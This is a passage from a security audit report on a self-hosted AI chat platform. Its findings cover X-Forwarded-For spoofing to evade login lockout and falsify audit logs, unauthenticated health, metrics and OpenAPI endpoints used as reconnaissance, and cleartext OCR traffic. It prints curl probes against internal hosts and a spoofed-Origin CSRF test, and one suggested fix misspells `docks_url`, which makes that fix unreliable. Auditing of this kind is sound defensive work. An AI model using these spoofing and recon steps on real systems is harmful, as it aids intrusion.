*Verification.* Every cited line is real. frontend/lib/proxy.ts:36-39: `const forwardedFor = req.headers.get('cf-connecting-ip') ?? req.headers.get('x-forwarded-for'); if (forwardedFor) headers['x-forwarded-for'] = forwardedFor;` — the client-controlled header is PREFERRED. orchestrator/app/authn/sessions.py:225-231 `client_meta()` takes `x-forwarded-for.split(',')[0]` when `settings.auth_trust_proxy_headers`. orchestrator/app/authn/api.py:81-87 keys the throttle on `f"ip:{ip or 'unknown'}"`. And the switch is genuinely on in production even though the repo default is off: orchestrator/app/config.py:1224 `_bool("AUTH_TRUST_PROXY_HEADERS", False)`, but `docker inspect sf-local-ai-orchestrator-1` returns AUTH_TRUST_PROXY_HEADERS=true (I ran it). The per-email lock genuinely does not substitute for the per-IP lock: a spray of one password across the member roster is one failure per email and never reaches AUTH_LOGIN_MAX_FAILS=8 (config.py:1218). Why ADJUSTED, not CONFIRMED as written: the frontend is not the attacker's only laundering path, so fixing proxy.ts alone fixes nothing. The orchestrator itself is published on `${TECHSARA_BIND_ADDRESS}:8080` (compose.yaml:233) and production has set that to 0.0.0.0 — LISTEN 0.0.0.0:8080 is in the verified facts — so the same LAN attacker can POST /auth/login directly to the orchestrator with a handwritten `X-Forwarded-For` and get the identical audit row and identical throttle-key bypass, with the frontend out of the picture entirely. And the internet path is honest: Cloudflare overwrites Cf-Connecting-IP on requests it proxies, so a tunnel client cannot forge it. The x-forwarded-proto half of the finding (proxy.ts:40-41) is REFUTED as stated: sessions.py:171-174 `_cookie_secure()` returns True immediately when `auth_cookie_secure == 'true'`, and `docker inspect` shows AUTH_COOKIE_SECURE=true, so the forwarded proto is never consulted. It becomes live again only if that setting returns to its 'auto' default (config.py:1210).

*Exploitable today.* yes — precondition is a LAN/tailnet position; no credentials. Two effects: audit_events and session rows record an attacker-chosen address, and the per-IP login lockout never arms. NOT exploitable from the internet: Cloudflare rewrites Cf-Connecting-IP at the edge.

*Fix.* Fix it at the trust boundary, not only at the proxy. (1) orchestrator/app/authn/sessions.py:225-231 — honour X-Forwarded-For only when `request.client.host` is the frontend container's address (or an explicit AUTH_TRUSTED_PROXY_CIDRS allowlist), and take the LAST hop rather than `split(',')[0]`. (2) frontend/lib/proxy.ts:36-39 — stop preferring `cf-connecting-ip`; forward only what the BFF itself received from cloudflared, and drop the client-supplied `x-forwarded-proto` at 40-41 while you are there. (3) Independent of both, stop publishing the orchestrator on 0.0.0.0: set TECHSARA_BIND_ADDRESS back to 127.0.0.1 for the orchestrator's port mapping so cloudflared and the frontend are the only ingress.

*Fix risk.* Medium. Getting the trusted-peer allowlist wrong makes every audit row read as the frontend container's IP (a loss of fidelity, not an outage) or, if AUTH_TRUST_PROXY_HEADERS is simply turned off, the same. Item (3) is the one with teeth: re-binding the orchestrator's published port breaks anything on the LAN that talks to :8080 directly — notably the interview-analysis tenant on the worker — so it needs a maintenance window and a check of that consumer first. (1) and (2) need only an orchestrator restart and a frontend restart respectively; no model restart.

### F004 — The page gate will 307 the planned /v1 API and /docs pages to /login

**P2** · frontend-app · `frontend/lib/auth.ts:221` · verdict **CONFIRMED** · blocks release

*Evidence.* const PUBLIC_PAGES = new Set(['/login', '/accept-invite', '/access-removed']);
const PUBLIC_PREFIXES = ['/share/'] as const;

function isPublicPrefixPage(page: string): boolean {
  return PUBLIC_PREFIXES.some(
    (prefix) =>
      page.startsWith(prefix) &&
      page.length > prefix.length &&
      page.indexOf('/', prefix.length) === -1,   // ← one segment only
  );
}

Evaluated: authRedirect('/docs', false) → '/login'; authRedirect('/docs/quickstart', false) → '/login'; authRedirect('/v1/responses', false) → '/login'. All three also pass the matcher, so the middleware actually issues the redirect.

*Impact.* Public developer docs at /docs are unreachable to any signed-out visitor and to every crawler. Worse, if the public versioned API is served by Next at /v1/responses, every API-key client — which by definition carries no ts_session cookie — receives a 307 to /login instead of a response; SDKs that follow redirects will POST their JSON at an HTML login page. This blocks the build rather than merely inconveniencing it.

*Verification.* A design defect for the platform rather than a current bug, and correctly described. frontend/lib/auth.ts:220-231: PUBLIC_PAGES = {'/login','/accept-invite','/access-removed'}, PUBLIC_PREFIXES = ['/share/'], and isPublicPrefixPage's depth guard `page.indexOf('/', prefix.length) === -1` makes exactly one segment public. authRedirect (auth.ts:252-274) returns '/login' for any other path when hasSessionCookie is false, and the matcher does select all three: my regex run gives /docs true, /docs/quickstart true, /v1/responses true. So an API-key client POSTing to a Next-served /v1/responses with no ts_session cookie gets a 307 to /login, and an SDK with default redirect-following would re-POST its JSON at an HTML page. No /docs or /v1 route exists yet (`find app -name page.tsx` lists 23 pages, none under /docs or /v1), so nothing is broken right now.

*Exploitable today.* no — nothing exists at those paths. It becomes a hard functional break (not a security hole) the day /v1 or /docs is served from Next.

*Fix.* Serve /v1/* from the orchestrator, not from Next: API-key auth has no relationship to the browser session and should never traverse a page gate. If same-origin is required for the console, add /v1/ to the early return at frontend/lib/auth.ts:256 next to '/api/' and '/_next/', AND add it to the matcher exclusion in middleware.ts:35 — both halves, since either alone leaves the other as the gate. For docs, add '/docs' to PUBLIC_PAGES and note that a '/docs/' PUBLIC_PREFIXES entry only opens one level because of the depth guard at auth.ts:228.

*Fix risk.* Low if done as a deliberate design decision now. The risk to avoid is relaxing the depth guard globally: auth.ts:224-230 comments that it is the only place a signed-out request is let through, so a blanket `startsWith` there would open every path under a public prefix. Frontend rebuild only.

### N002 — No Next proxy forwards Authorization, so an API-key credential cannot cross the BFF at all

**P2** · frontend-app · `frontend/lib/proxy.ts:25` · verdict **FOUND IN VERIFICATION**

*Evidence.* `grep -rni "'authorization'\|\"authorization\"" app lib` in frontend/ returns nothing. Every proxy builds its upstream header object as an explicit allowlist and none of them lists it: lib/proxy.ts:25-43 (cookie, content-type, x-forwarded-for, x-forwarded-proto, user-agent), app/api/artifacts/[[...path]]/route.ts:235 `FORWARD_REQUEST_HEADERS = ['cookie','range','if-none-match','content-type']`, app/api/chat/route.ts:298-305 (content-type + cookie only), and the admin download relay at app/api/admin/[...path]/route.ts:66-72 (cookie only).

*Impact.* Every cookie-shaped assumption in this layer is load-bearing for the platform. The day an API-key client calls anything under /api/*, its bearer token is dropped on the floor and the orchestrator sees an anonymous request — which fails closed (401), so it is not a bypass, but it means the BFF as built cannot carry API-key auth at all and every /v1 design that routes through Next is dead on arrival. It also compounds F005: with no Authorization going up and no WWW-Authenticate coming back, an API client gets a bare 401 with no challenge and no way to tell a bad key from a missing session.

*Fix.* Decide it deliberately rather than by omission: serve /v1/* straight from the orchestrator (the same conclusion F004 reaches for a different reason), and if any key-authenticated path must traverse Next, add `authorization` to the request allowlist in lib/proxy.ts and `www-authenticate` to the response allowlist from F005's fix — as one change, with a test, so the two directions land together. Frontend rebuild only.

### F046 — Image and other multimodal prompts are sized as text-only, so a large image prefill never reaches the LONG lane

**P2** · inference-model-registry · `orchestrator/app/context.py:135` · verdict **ADJUSTED**

*Evidence.* `estimate_messages` counts only string content and the `text` parts of a multimodal list: `for part in content: if isinstance(part, dict) and isinstance(part.get("text"), str): total += estimate_tokens(part["text"])` (context.py:132-139) — image_url parts contribute nothing. `admission.prompt_tokens` returns that estimate outright when it is below half the threshold: `if estimate < threshold // 2 or estimate > threshold * 2: return estimate` (admission.py:213-215), and `count_tokens` falls back to the same estimate on any /tokenize failure, which the code notes is what multimodal payloads do (context.py:175-177).

*Impact.* A message with up to MAX_IMAGES=5 attachments and a short question estimates at a few hundred tokens and takes the NORMAL lane (capacity 10), even though its real prefill can be very large. That is precisely the concurrent-large-prefill load shape the LONG lane exists to prevent after the 2026-09-11 GDN fault, so the protection has a hole exactly where vision requests are. A public API accepting images widens it.

*Verification.* The code claim is exactly right: context.py:127-141 `estimate_messages` adds `estimate_tokens(part["text"])` for dict parts carrying a string `text` and nothing at all for `image_url` parts, and admission.py:212-216 `prompt_tokens` returns that estimate outright when `estimate < threshold // 2`. context.py:174-177 confirms multimodal /tokenize failures fall back to the same estimate. But the IMPACT is overstated, which is why this is ADJUSTED. main.py:635 caps MAX_IMAGES=5 (enforced at main.py:771-772) and there is no path by which five images reach anything like the 131,072-token threshold: engines/vision.py:103-109 `to_data_url` does not resize, but the serving processor's own pixel cap puts a Qwen-VL image in the low thousands of tokens, so five of them is on the order of 20-25k tokens — an order of magnitude short of moving a request into the LONG lane on their own. The realistic defect is narrower: a borderline text+images prompt is mis-laned by up to ~25k tokens. It is also not true that this is 'precisely the load shape the LONG lane exists to prevent' — the NORMAL lane deliberately admits 10 concurrent ordinary prefills by design.

*Exploitable today.* no, not as stated. A signed-in user can under-report roughly 25k tokens of prefill, which cannot by itself select the wrong lane for any prompt that was not already within 25k of the boundary. The genuinely exploitable sizing bypass in this area is the character estimator, which I report separately as M2.

*Fix.* Give `estimate_messages` an image term (a flat per-image constant, ~525 tokens for an 896 px frame, or one derived from the data: URL length) and, in admission.prompt_tokens, skip the `estimate < threshold // 2` shortcut whenever any message content is a list — so a multimodal prompt always gets the exact /tokenize count. Better still, fold this into the M2 fix and stop estimating at admission altogether.

*Fix risk.* Orchestrator container restart only. The risk is pushing more traffic into the LONG lane (capacity 1) than intended and slowing vision turns; size the constant from a real measurement, not the docstring, and watch `llm_admission_lane_active{lane="long"}` after the change.

### F047 — The engine controller's /state document is served unauthenticated on every host interface

**P2** · inference-model-registry · `orchestrator/app/config.py:1427` · verdict **ADJUSTED**

*Evidence.* `ENGINE_CONTROLLER_URL` defaults to `http://vllm:9838/state`; the controller runs host-network and `ss -ltn` shows `LISTEN 0 5 0.0.0.0:9838`. `curl http://192.168.9.54:9838/state` returned 200 with the full document: primary_ready, readiness probe internals (ttft_s, tokens, connect_s), incident id, cold-start detail, recovery step.

*Impact.* Operational disclosure to anyone on the LAN/tailnet: exactly when the engine is wedged, recovering or cold-starting, and how long the recovery takes. That is a reliable timing oracle for choosing when to hit the unauthenticated model port, and it leaks the availability posture the developer docs will describe as internal. scripts/cluster-recover.sh:52 shows the same service also takes POST /recover — I did not exercise it, so whether the mutating route is equally open is unverified.

*Verification.* The disclosure half is confirmed: monitoring/engine-controller/controller.py:290 and :356 default `bind` to 0.0.0.0 (CONTROLLER_BIND), `ss -ltn` shows `LISTEN 0 5 0.0.0.0:9838`, and `curl http://192.168.9.54:9838/state` returned 200 with primary_ready, the readiness probe internals (ttft_s, connect_s, tokens, tokens_delta), the recovery block (step, budget, attempts_in_window, cooldown_until, incident_id) and the api/canary signals — unauthenticated, and controller.py:3196-3208 has no auth check on do_GET for /state, /metrics or /healthz. The speculative half is REFUTED, which is why this is ADJUSTED: POST /recover is NOT equally open. controller.py:3210-3226 checks the path and the peer BEFORE reading the body and returns 403 unless `is_loopback(peer)`, and common.py:804-807 defines that as exactly '127.0.0.1' or '::ffff:127.0.0.1'. I verified it: `curl -X POST http://192.168.9.54:9838/recover` from this host's LAN address returned 403. (For completeness I also read the worker sentinel, sentinel.py:400-470 — POST /restart requires peer == head_ip AND the token, and the sentinel binds to the RoCE address, so it is not a LAN surface either.) What is left is read-only operational disclosure.

*Exploitable today.* yes but read-only — LAN/tailnet position, no credential, and the only gain is telemetry. It is a decent timing oracle for choosing when to hit the open port in F042, and it pairs with my M1 finding (the orchestrator's own /health gives the admission-lane occupancy) to make that targeting precise. No state change is reachable.

*Fix.* Cover tcp/9838 with the same host filter written for F042 — accept from 127.0.0.1 and the docker bridge ranges (the orchestrator polls it as http://vllm:9838/state via host-gateway, config.py:1427, so a pure loopback bind would break the poll), drop on enP7s7 and tailscale0. Do not set CONTROLLER_BIND=127.0.0.1 without checking that poll first.

*Fix risk.* Firewall rule: no restart. Setting CONTROLLER_BIND would restart the engine-controller container — harmless in itself, but the controller is the recovery authority for the main model pair, so do not do it while the engine is in a recovery window, and confirm /health's `checks.vllm.engine.controller.unknown` stays false afterwards.

### F048 — The AsyncOpenAI client cache is cleared without closing the clients, leaking httpx connection pools

**P2** · inference-model-registry · `orchestrator/app/llm.py:398` · verdict **ADJUSTED**

*Evidence.* `if len(_CLIENTS) > 64:  # tests: many loops; production: a handful` followed by `_CLIENTS.clear()` (llm.py:398-399) — the evicted AsyncOpenAI objects are dropped without `await client.close()`, so their httpx pools and open sockets are released only at garbage collection. The same shape exists in context.py:111-112 for the /tokenize clients.

*Impact.* In a long-lived process with many distinct (base_url, api_key, read_timeout) keys — which is exactly what per-API-key clients or per-caller read timeouts on a new /v1 surface would create — this leaks sockets to vLLM and can exhaust the pool, surfacing as httpx.PoolTimeout, which the breaker classifies as `queue_timeout` and reports as our own queue rather than a leak.

*Verification.* The code shape is real: llm.py:397-400 is `if len(_CLIENTS) > 64: _CLIENTS.clear()` with no `await client.close()` for the evicted AsyncOpenAI objects, and context.py:110-112 does the same for the /tokenize httpx clients. But it does not bite today and the impact statement is wrong about that. The cache key is `(loop_key, base_url, api_key or LOCAL_API_KEY, read)` (llm.py:377) and nothing caller-controlled feeds it: `read_timeout` has exactly one caller, llm.py:1267 for embeddings, and that value comes from a settings constant or a small fixed set (llm.py:1266). In the production process there is one loop and a handful of base URLs, so `len(_CLIENTS)` never approaches 64 and `.clear()` never runs. Even when it does (the test suite), CPython refcounting drops the last reference immediately and the transport's sockets go with it — this is latent hygiene, not a live leak, and I saw no evidence of PoolTimeout being mis-classified. The finding's own forward-looking framing ('per-API-key clients … on a new /v1 surface') is the accurate part.

*Exploitable today.* no — unreachable in the production process as configured. It becomes reachable only if a future surface keys the cache on caller-supplied values (per-API-key clients, per-caller read timeouts), which is exactly what the developer platform would introduce.

*Fix.* Two things, both small: make eviction LRU rather than a wholesale clear and fire `asyncio.create_task(client.close())` for each evicted entry (llm.py:397-400, and the same at context.py:110-112); and write down, at the cache, that the key must never include a caller-supplied value. Treat it as a precondition of the /v1 work rather than a fix to ship now.

*Fix risk.* Orchestrator container restart only; no model restart. The one real hazard is closing a client that still has an in-flight stream — schedule the close, never await it inline, and evict by recency so an active client is the last candidate.

### F049 — Module and function docs still describe gpt-oss-120b and a 131072 window, which the /docs build would publish as fact

**P2** · inference-model-registry · `orchestrator/app/llm.py:405` · verdict **ADJUSTED**

*Evidence.* `def _openai_client(): """Client for the main model (gpt-oss-120b) on OPENAI_BASE_URL."""` (llm.py:404-406) and the section banner `# gpt-oss-120b (main model)` (llm.py:410-411), while settings.llm_model is Qwen/Qwen3.6-35B-A3B-NVFP4. context.py:5 still says "the main model runs at 131072" where the live served window is 1,000,000, and llm.py:777 says "the 262k window is the only wall above that" against the same live 1M.

*Impact.* The developer documentation and the console's model card are the first things that will be generated from this area. Publishing a retired model name and two wrong context numbers on a public /docs page is a credibility and support cost, and the 262k/131k figures would be copied into client-side prompt budgeting.

*Verification.* Every factual claim is correct. llm.py:405 is `"""Client for the main model (gpt-oss-120b) on OPENAI_BASE_URL."""`, llm.py:410 is the banner `# gpt-oss-120b (main model)`, config.py:100 carries the same stale name, and llm.py:747 still refers to gpt-oss's Reasoning line — while the served model is Qwen/Qwen3.6-35B-A3B-NVFP4 (confirmed from the live /v1/models response and settings.llm_model, config.py:108). context.py:4 says 'the main model runs at 131072' and llm.py:777 says 'the 262k window is the only wall above that', against a live window of 1,000,000: /health reports configured_max_model_len 1000000 and served_max_model_len 1000000, and the engine Cmd carries --max-model-len 1000000 with a yarn factor of 3.82 over original_max_position_embeddings 262144. ADJUSTED only because the impact is asserted, not demonstrated: nothing today generates documentation or a model card from these docstrings, so 'the /docs build would publish as fact' is a hypothetical about work that does not exist yet. This is code-comment rot, not a defect with a failure mode.

*Exploitable today.* no — there is no security or availability consequence. The cost is a future one: whoever writes the model card or budgets client-side prompts from these comments will be wrong by a retired model name and a factor of 4-8 on the window.

*Fix.* Replace the three strings: llm.py:405 and :410 should name `settings.llm_model` rather than a literal; context.py:4 and llm.py:777 should say the window is read from the serving engine via `context.model_window` / the /tokenize `max_model_len`, with no number in the prose. If a docs page is built later, render the live values from /health's `context` block (which already publishes configured_max_model_len, served_max_model_len and the serving_flags) instead of quoting prose.

*Fix risk.* None — comment-only. No restart, no window. Bundle it with any other orchestrator change rather than deploying on its own.

### N014 — One user-triggerable 400 on any streaming call permanently disables token telemetry for the whole orchestrator process

**P2** · inference-model-registry · `orchestrator/app/llm.py:264` · verdict **FOUND IN VERIFICATION**

*Evidence.* `_open_stream` (llm.py:243-280) asks for `stream_options={"include_usage": True}` and wraps the send in `except _bad_request_error():` — and `_bad_request_error()` (llm.py:298-302) returns openai.BadRequestError, i.e. EVERY 400, not only the one that means 'this runtime does not know stream_options'. On any 400 it sets the process-global `_ASK_FOR_USAGE["enabled"] = False` (llm.py:85, 273) and logs 'token telemetry will read not measured until restart'. From that point every streamed turn in the process sends no stream_options, `_capture_usage` (llm.py:112-121) sees no usage chunk, `get_usage()` returns None, and main.py:490-491 writes NULL into usage_events.input_tokens/output_tokens. The 2026-09-11 hardening narrowed this from 'every exception' to 'a 400' but did not narrow it to the stream_options 400 specifically. A 400 from the engine is user-triggerable — a corrupt or unsupported image is the easy one, since engines/vision.py:103-109 passes the client's base64 through as a data: URL with no validation, and the vision path streams (llm.py:833, 896).

*Impact.* A single malformed upload silently switches off streaming token accounting for every user until the orchestrator is restarted. Combined with F045 (json_completion and chat_completion_with_reasoning never capture at all), the usage ledger cannot be trusted as a billing or quota source — and the failure is not loud: get_usage() returning None is correctly rendered as 'not measured' rather than zero, so the console shows gaps, not an alarm. For a metered developer API this is a direct revenue-and-quota integrity hole with a one-request trigger.

*Fix.* Narrow the catch: only disable the option when the 400 body actually names stream_options / include_usage (inspect `exc.body` or the message and re-raise otherwise), and make the flag recover — a TTL, or re-enable on the next process-level engine readiness transition — rather than latching until restart. Add a counter so an operator can see the flag has flipped. Orchestrator container restart only; no model restart, no production window.

### N015 — The orchestrator's /health and /metrics are unauthenticated on 0.0.0.0:8080 and publish live admission-lane, breaker and engine-load internals

**P2** · inference-model-registry · `orchestrator/app/main.py:988` · verdict **FOUND IN VERIFICATION**

*Evidence.* main.py:988 `@app.get("/health")` and main.py:1028 `@app.get("/metrics")` carry no principal dependency — contrast /chat, which resolves `current_principal` and raises 401 at main.py:1655-1659. `docker ps` shows the orchestrator published as `0.0.0.0:8080->8080/tcp`. I fetched both from the LAN address with no cookie: `curl http://192.168.9.54:8080/health` -> 200 returning `admission: {normal:{capacity:10,active,waiting,closed}, long:{capacity:1,...}, long_threshold_tokens:131072}`, `breakers.main` state and failure count, the controller URL and its `requests_running`/`requests_waiting`, `context.served_max_model_len: 1000000`, `serving_flags` (kv_cache_dtype, prefix_caching, chunked_prefill, max_num_batched_tokens), `app_db.schema_version: 33`, LanceDB directories and the embedding model id; `curl .../metrics` -> 200 with llm_admission_lane_active, llm_admission_waiting, llm_breaker_state, llm_engine_state_code, llm_queued_generations. No per-user labels, so no personal data leaks.

*Impact.* This is the targeting oracle that turns the other findings in this area from theoretical into precise. It publishes the LONG threshold an attacker needs to cross (F042 / my M2), live lane occupancy and `requests_running` — which is exactly the idle condition a LONG request waits for before it closes the NORMAL lane (F044) — and the breaker's state, so an attacker on the LAN can time an attempt for maximum effect and watch it land. It also hands over the deployment inventory (schema version, serving flags, engine window) that a developer-platform threat model would call internal.

*Fix.* Split the endpoint: keep an unauthenticated liveness probe that returns only `{"status": "ok"}` for the container healthcheck and the tunnel, and move the detailed document behind the existing principal dependency (or an operator capability, matching the analytics console's super-admin gate). Put /metrics behind the same host filter as tcp/8000 and 9838 — Prometheus scrapes it from inside the compose network, so nothing legitimate needs it on enP7s7 or tailscale0. Orchestrator container restart only. Check the container healthcheck and any Grafana/blackbox probe still pass against whatever you leave unauthenticated.

### N016 — User-submitted OCR images cross the office LAN in cleartext because OCR_BASE_URL points at the worker's management interface, not the RoCE fabric

**P2** · inference-model-registry · `compose/compose.ocr.yaml:41` · verdict **FOUND IN VERIFICATION**

*Evidence.* The live orchestrator env has `OCR_BASE_URL=http://192.168.9.68:30004/v1` and `OCR_REMOTE_BASE_URL` the same — 192.168.9.68 is the worker's management address on the same 1 GbE office LAN this host reaches as 192.168.9.54/22, not the RoCE fabric (10.100.184.0/24 / 10.100.185.0/24) that CLUSTER_WORKER_IP names and that every other head-to-worker path is deliberately pinned to (compose/compose.cluster-dgx-spark.yaml pins NCCL_SOCKET_IFNAME and GLOO_SOCKET_IFNAME to the RoCE link with the comment 'so nothing rides the 1 GbE LAN by accident'). compose/compose.ocr.yaml:41 binds `--host ${OCR_BIND}`, which scripts/ocr.sh derives from the node's management interface, and the scheme is plain http with OCR_REQUIRES_AUTHENTICATION=false.

*Impact.* Every page image the OCR engine processes — scanned contracts, IDs, whatever a user uploads — travels the shared office LAN unencrypted and unauthenticated, in both directions, along with the transcribed text in the response. Anyone with a port mirror, a switch compromise or an ARP position on that segment reads user document content, which is a confidentiality exposure of a different kind from F043's inbound one and is not fixed by simply firewalling the port. It gets worse with a public API, where document volume goes up and the content stops being first-party.

*Fix.* Point the OCR path at the fabric: set OCR_BIND to the worker's RoCE address and OCR_BASE_URL / OCR_REMOTE_BASE_URL to match, so the traffic uses the same private link the cluster already trusts for NCCL and gloo. Restarts the OCR sidecar on the worker and the orchestrator, in lockstep — no main-model restart, no production window — and must be verified with a real image, not /health, since /health cannot distinguish a working OCR engine from a degenerate one.

### F013 — /docs, /redoc and /openapi.json are enabled and unauthenticated on a 0.0.0.0-published port, disclosing all 94 paths including the entire admin surface

**P2** · orchestrator-core · `orchestrator/app/main.py:219` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` — no `docs_url=None`, no `openapi_url=None`, and no auth dependency on them. Live introspection returns `docs_url= /docs redoc_url= /redoc openapi_url= /openapi.json`. The container publishes on 0.0.0.0:

  $ docker inspect sf-local-ai-orchestrator-1 --format '{{json .NetworkSettings.Ports}}'
  {"8080/tcp":[{"HostIp":"0.0.0.0","HostPort":"8080"}]}

  $ curl -o /dev/null -w 'status=%{http_code}\n' http://127.0.0.1:8080/docs     → status=200
  $ curl -o /dev/null -w 'status=%{http_code}\n' http://127.0.0.1:8080/redoc    → status=200
  $ curl -s http://127.0.0.1:8080/openapi.json | python3 -c "import json,sys;d=json.load(sys.stdin);p=list(d['paths']);print(len(p),'paths');print([x for x in p if 'admin' in x][:6])"
  94 paths
  ['/admin/api/overview', '/admin/api/members', '/admin/api/members/{user_id}', '/admin/api/members/{user_id}/role', '/admin/api/members/{user_id}/status', '/admin/api/members/{user_id}/sessions']

*Impact.* Any host on the LAN gets a complete, machine-readable map of the private API — every admin route (member deletion, role change, password reset, session revocation, conversation/upload/report reading), every request schema, every field name. This is precisely the reconnaissance that authn/principal.py:127-139 goes to the trouble of denying by answering 404 instead of 403 for a missing capability; the OpenAPI document hands it over for free. It also directly BLOCKS the planned developer docs at /docs: that path is taken on the orchestrator, and any proxy rule that forwards /docs to it will serve Swagger for the internal API to the public.

*Verification.* orchestrator/app/main.py:219 is exactly `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` — no docs_url/redoc_url/openapi_url override and no dependency. Live: /docs 200, /openapi.json 200, 94 paths, and the admin paths listed in the finding are all present verbatim. `docker inspect` on the running orchestrator confirms `{"8080/tcp":[{"HostIp":"0.0.0.0","HostPort":"8080"}]}`. The facts are all correct. I downgrade to P2 because the disclosure is a path/schema map only — every route it names is individually authenticated (spot-checked /chat/attach main.py:3802 `_require_viewer` + `_owns`, /chat/requests main.py:3722 user_id check, /chat/salesforce main.py:3548-3554 owner check), so this is reconnaissance, not access, and it is LAN-scoped.

*Exploitable today.* yes, for reconnaissance only — any LAN/tailnet host, no credential. It does not grant access to any route it describes.

*Fix.* Pass `docks_url=None, redoc_url=None, openapi_url=None` at main.py:219 and build the public schema explicitly from the /v1 router with `get_openapi(routes=v1_router.routes)`. Note the second-order point the finding makes is real and worth acting on independently: /docs is already taken on the orchestrator, so a proxy rule forwarding /docs to it would serve the INTERNAL Swagger publicly.

*Fix risk.* Orchestrator container restart only (no model restart). Risk is that a developer workflow or a test depends on /openapi.json — grep the test suite and scripts/ before flipping it, and prefer gating over deleting if anything does.

### F014 — GET /health is unauthenticated and returns internal hostnames, container paths, engine capacity and incident state

**P2** · orchestrator-core · `orchestrator/app/main.py:988` · verdict **ADJUSTED** · claimed P1

*Evidence.* `@app.get("/health")` at main.py:988 has no dependency and forwards `report["checks"]`, which includes `health.engine_availability()` (health.py:716-745), which includes `engine_state.describe()` — and that dict carries `"url": settings.engine_controller_url or None` at engine_state.py:269. Live, unauthenticated:

  $ curl -s http://127.0.0.1:8080/health
  ..."controller":{"url":"http://vllm:9838/state",...,"state":"READY","reason":"canary ok in 0.12s","recovery_step":"idle","incident_id":null,"requests_running":0,"requests_waiting":0}...
  "breakers":{"main":{"state":"CLOSED","failures_in_window":0,"threshold":3,...}}
  "admission":{"normal":{"capacity":10,"active":0,"waiting":0},"long":{"capacity":1,...},"long_threshold_tokens":131072}
  "app_db":{"status":"ok","schema_version":33}
  "web_index":{"directory":"/data/lancedb-web","table":"web_chunks","rows":22403,"model_id":"Qwen/Qwen3-Embedding-0.6B",...}
  "artifacts":{"renderers":{...},"volume_writable":true,"free_mb":2766244}

Additionally, engine_availability()'s own error path returns `{"status":"unknown","detail": f"{type(exc).__name__}: {exc}"[:200]}` (health.py:745) — an exception string on an unauthenticated wire.

*Impact.* An internal service hostname (`vllm`), an internal port (9838), container filesystem paths, the app DB schema version, free disk, the exact concurrency ceilings and the live engine queue depth all reach any unauthenticated LAN caller. Knowing `capacity: 10` and `requests_running` tells an attacker exactly how many concurrent requests saturate the model — which is the load shape that caused the 2026-09-11 GDN fault this very module was written to avoid. The inconsistency is stark: /audio/health (audio_api.py:269-280) is deliberately gated on Cap.ANALYTICS_READ with the comment "a signed-in gate here would have handed the same reconnaissance back through a second door", while /health hands over strictly more.

*Verification.* main.py:988-1027 `@app.get("/health")` has no dependency and forwards report['checks'], 'context', 'web_index', 'work' and 'artifacts'. I fetched it with no cookie and got, verbatim: `"controller":{"url":"http://vllm:9838/state",...,"state":"READY","requests_running":0,"requests_waiting":0}`, `"breakers":{"main":{"state":"CLOSED","threshold":3}}`, `"admission":{"normal":{"capacity":10},"long":{"capacity":1},"long_threshold_tokens":131072}`, `"app_db":{"schema_version":33}`, `"web_index":{"directory":"/data/lancedb-web","rows":22403}`, `"artifacts":{"free_mb":2766209}`. Every quoted item is real. The /audio/health contrast is also real. I downgrade to P2 because none of it is a credential, user datum or conversation content — it is operational topology, and the same class of data is deliberately published unauthenticated on /metrics (main.py:1030, whose docstring says Prometheus scrapes it without credentials; I checked the exposition and the labels are a closed set with no user ids, but llm_admission_lane_active, llm_breaker_state and live_generations are all there). Closing /health while /metrics stays open would move the needle very little.

*Exploitable today.* yes — any LAN/tailnet host, no credential. Value to an attacker is knowing capacity=10 is the saturation point and that an internal service answers at vllm:9838.

*Fix.* Keep `GET /health` returning only {status, service, version} — that is all the container healthcheck and the blackbox probe gate on — and move checks/context/web_index/work/artifacts to `GET /health/detail` behind `Depends(require_capability(Cap.ANALYTICS_READ))`. Replace `settings.engine_controller_url` in engine_state.describe() (engine_state.py:269) with a boolean `configured`. Do /metrics at the same time or the fix is half a fix.

*Fix risk.* Orchestrator container restart. Real risk: the admin dashboard and scripts/cluster-verify-engine.sh consume the detailed /health body — grep frontend/ and scripts/ for '/health' and repoint them at /health/detail with a session before trimming, or the engine panel goes blank. No model restart.

### F019 — BUILD BLOCKER — the app-wide CSRF middleware and the 3-origin CORS allowlist will break every browser-based /v1 client

**P2** · orchestrator-core · `orchestrator/app/main.py:243` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* `@app.middleware("http")\nasync def _reject_cross_site_writes(request, call_next):\n    if request.method not in ("GET", "HEAD", "OPTIONS"):\n        origin = request.headers.get("origin")\n        if origin and origin not in _TRUSTED_ORIGINS:\n            return JSONResponse(status_code=403, content={"detail": "cross-site request refused"})` (main.py:243-252), with `_TRUSTED_ORIGINS = set(settings.cors_allow_origins)` frozen at import (main.py:240). It is registered on the app, so it runs for EVERY path with no exemption. Confirmed live against a path that does not even exist:

  $ curl -i -X POST -H 'Origin: https://evil.example' -d '{}' http://127.0.0.1:8080/__probe
  HTTP/1.1 403 Forbidden
  {"detail":"cross-site request refused"}

CORSMiddleware (main.py:225-231) is likewise app-wide with `allow_origins=['https://ai.techsarasolutions.com','http://localhost:3000','http://127.0.0.1:3000']`.

*Impact.* A third-party developer's web app calling `POST /v1/responses` with `Authorization: Bearer sk-...` from their own origin sends an `Origin` header (browsers always do on cross-origin POST), so this middleware 403s it before routing — and because the middleware is OUTSIDE CORSMiddleware the 403 carries no Access-Control-Allow-Origin, so the browser surfaces an opaque CORS failure rather than a readable status. Every browser /v1 client is dead on arrival. Server-to-server clients (no Origin header) pass, which will make this look like it works in curl and fail only for real customers.

*Verification.* The mechanism is exactly as described and I reproduced it live. main.py:243-253 registers `_reject_cross_site_writes` on the app with no path exemption; _TRUSTED_ORIGINS is frozen at import from settings.cors_allow_origins (main.py:240). Live: `curl -X POST -H 'Origin: https://evil.example' -d '{}' http://127.0.0.1:8080/__probe` → `HTTP/1.1 403 Forbidden {"detail":"cross-site request refused"}` on a path that does not exist, proving it runs before routing. CORSMiddleware at main.py:225-231 is likewise app-wide with the three-origin allowlist. I adjust the severity because this is not a defect in shipped code — no /v1 router exists yet — it is a correct-today control that will block a surface that has not been built. As a forward-looking constraint it is accurate and important.

*Exploitable today.* no — nothing is broken today, and the middleware is doing the right thing for the cookie-authenticated surface it was written for. It becomes a hard failure the moment a browser-based /v1 client with a bearer token exists.

